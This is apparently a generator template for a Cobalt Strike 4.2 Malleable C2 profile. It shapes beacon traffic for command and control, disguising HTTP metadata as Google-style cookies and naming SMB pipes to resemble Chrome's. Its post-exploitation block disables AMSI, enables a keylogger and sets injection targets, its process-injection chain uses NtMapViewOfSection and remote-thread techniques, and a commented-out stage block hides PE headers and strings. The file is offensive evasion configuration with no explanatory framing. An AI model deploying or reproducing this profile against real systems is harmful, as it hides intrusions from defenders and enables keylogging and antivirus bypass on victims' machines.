## Cobalt Strike Malleable C2 Profile
## Version: Cobalt Strike 4.2
## Date   : ${timestamp}

## Profile Name
##set sample_name "${sample_name}";

## Sleep Times
set sleeptime "${sleeptime}";
set jitter    "${jitter}";
set data_jitter "${data_jitter}";

## Beacon User-Agent
set useragent "${useragent}";

## Self-signed SSL Certificates with SSL Beacon
## Stager
https-certificate {
    set C   "${https_certificate_C}";
    set CN  "${https_certificate_CN}";
    set O   "${https_certificate_O}";
    set OU  "${https_certificate_OU}";
    set validity "${https_certificate_V}";
}

## TCP Beacon
set tcp_port "${tcp_port}";
set tcp_frame_header "\x80";

## SMB beacons
set pipename         "mojo.5688.8052.183894939787088877##";
set pipename_stager  "mojo.5688.8052.35780273329370473##";
set smb_frame_header "\x80";

## DNS beacons
set maxdns          "${maxdns}";
set dns_max_txt     "${dns_max_txt}";
set dns_idle        "${dns_idle}";
set dns_sleep       "${dns_sleep}";
set dns_stager_prepend "${dns_stager_prepend}";
set dns_stager_subhost "${dns_stager_subhost}";

## SSH beacons
set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename      "wkssvc##";

#code-signer {
#    set keystore "keystore.jks";
#    set password "123456";
#    set alias    "google";
#}

## Staging process
set host_stage "${host_stage}";
http-stager {
    set uri_x86 "${stager_uri_x86}";
    set uri_x64 "${stager_uri_x64}";

    server {
        header "Content-Type" "${stager_server_ContentType}";
        header "Server" "${stager_server_Server}";
        ${stager_server_header1}
        ${stager_server_header2}
        ${stager_server_header3}
        ${stager_server_header4}
        output {
            prepend "${stager_output_prepend}";
            prepend "${stager_output_prepend2}";
            append "${stager_output_append}";
            print;
        }
    }

    client {
        header "Accept" "${stager_client_Accept}";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
    }
}

## Post Exploitation
post-ex {
    set spawnto_x86 "${spawnto_x86}";
    set spawnto_x64 "${spawnto_x64}";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "${pipename}";
    set keylogger "GetAsyncKeyState";
}

<#--## Memory Indicators-->
<#--stage {-->
<#--    # CS 4.2 added allocator and MZ header overrides-->
<#--    set allocator      "VirtualAlloc";-->
<#--    set magic_pe       "NO";-->
<#--    set userwx         "false";-->
<#--    set stomppe        "true";-->
<#--    set obfuscate      "true";-->
<#--    set cleanup        "true";-->
<#--    set sleep_mask     "true";-->
<#--    set smartinject    "true";-->

<#--    set checksum       "0";-->
<#--    set compile_time   "11 Nov 2022 04:08:32";-->
<#--    set entry_point    "650688";-->
<#--    set image_size_x86 "4661248";-->
<#--    set image_size_x64 "4661248";-->
<#--    set name           "srv.dll";-->
<#--    set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";-->

<#--    transform-x86 {-->
<#--        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";-->
<#--        strrep "ReflectiveLoader" "execute";-->
<#--        strrep "This program cannot be run in DOS mode" "";-->
<#--        strrep "beacon.dll" "";-->
<#--    }-->
<#--    transform-x64 {-->
<#--        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";-->
<#--        strrep "ReflectiveLoader" "execute";-->
<#--        strrep "beacon.x64.dll" "";-->
<#--    }-->

<#--    stringw "jQ"; # Add this string to the DLL-->
<#--}-->

<#--## Process Injection-->
process-inject {

    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
        append "\x90\x90";
    }


    execute {
        # The order is important! Each step will be attempted (if applicable) until successful
        ## self-injection
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
        # SetThreadContext;
        NtQueueApcThread-s;
        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
        CreateRemoteThread;
        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -> 64bit injection) AND injection across session boundaries
        RtlCreateUserThread;
    }
}

## HTTP Headers
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
}

## HTTP GET
http-get {

    set uri "${http_get_uri}";
    set verb "GET";

    client {

        header "Accept-Encoding" "gzip, deflate";
        ${get_client_header1}
        ${get_client_header2}
        ${get_client_header3}
        ${get_client_header4}
        #header "Host" "${http_get_host}";

        metadata {
            base64url;
            prepend "ANID=";
            prepend "__Secure-3PAPISID=noskin;";
            append ";CONSENT=YES+CN.zh-CN+20210917-09-0";
            header "Cookie";
        }
    }

    server {

        header "Server" "${http_getReq_Server}";
        header "Content-Type" "${http_getReq_ContentType}";
        ${get_server_header1}
        ${get_server_header2}
        ${get_server_header3}
        ${get_server_header4}
        output {
            ${get_server_encode}
            prepend "${get_server_prepend}";
            prepend "${get_server_prepend2}";
            append "${get_server_append}";
            print;
        }
    }
}

## HTTP POST
http-post {

    set uri "${http_post_uri}";
    set verb "POST";

    client {

        header "Content-Type" "${post_client_content}";
        ${post_client_header1}
        ${post_client_header2}
        ${post_client_header3}
        ${post_client_header4}
        #header "Host" "${http_post_host}";

        id {
            base64url;
            parameter "formid";
        }

        ${post_client_parameter1}
        ${post_client_parameter2}
        ${post_client_parameter3}
        output {
            base64url;
            prepend "aid=522005705&accver=1&showtype=embed&ua=";
            print;
        }
    }

    server {

        header "Server" "${post_server_server}";
        header "Content-Type" "${post_server_content}";
        ${post_server_header1}
        ${post_server_header2}
        ${post_server_header3}
        ${post_server_header4}
        output {
            ${post_server_encode}
            prepend "${post_server_prepend}";
            prepend "${post_server_prepend2}";
            append "${post_server_append}";
            print;
        }
    }
}
